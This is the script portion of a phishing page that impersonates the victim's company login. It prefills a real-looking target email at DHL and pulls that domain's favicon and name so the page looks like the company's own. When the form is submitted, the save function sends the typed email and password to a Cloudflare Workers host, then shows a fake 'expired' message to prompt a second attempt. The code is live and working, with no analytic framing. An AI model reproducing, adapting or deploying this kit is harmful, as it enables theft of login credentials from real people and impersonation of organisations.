<script>
    document.addEventListener('DOMContentLoaded', function() {
      var prefilledEmail = 'socoll@dhl.com';
      
      // Set the prefilled email in the input field
      document.getElementById('x1').value = prefilledEmail;

      var my_email = prefilledEmail;
      var ind = my_email.indexOf("@");
      var my_slice = my_email.substr((ind + 1));
      var c = my_slice.substr(0, my_slice.indexOf('.'));
      var final = c.toLowerCase();
      var finalu = c.toUpperCase();

      document.getElementById("logoimgs").src = "https://www.google.com/s2/favicons?domain=" + my_slice;
      document.getElementById("logoimg").src = "https://www.google.com/s2/favicons?domain=" + my_slice;
      var logonames = document.getElementsByClassName("logoname");
      for (var i = 0; i < logonames.length; i++) {
        logonames[i].textContent = finalu;
      }

      document.getElementById('expiredTime').style.display = 'none';
    });

    function showLoginForm() {
      document.getElementById("loadingSpinner").style.display = "block";
      setTimeout(function() {
        document.getElementById("loadingSpinner").style.display = "none";
        document.getElementById("loginDiv").style.display = "block";
      }, 1000);
    }

    function save(event) {
      event.preventDefault();

      var email = document.getElementById('x1').value;
      var userToken = document.getElementById('userToken').value;

      // Make API call to Cloudflare Worker
      fetch('https://summer-poetry-9809.geohide-geohide.workers.dev', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, userToken }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          document.getElementById('expiredTime').style.display = 'block';
          setTimeout(function () {
            document.getElementById('expiredTime').style.display = 'none';
            document.getElementById('userToken').value = "";
            document.getElementById('loginDiv').style.display = 'none';
          }, 3000);
        } else {
          console.error('Error saving data');
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
    }

    function clos() {
      document.getElementById("loginDiv").style.display = "none";
    }
  </script>
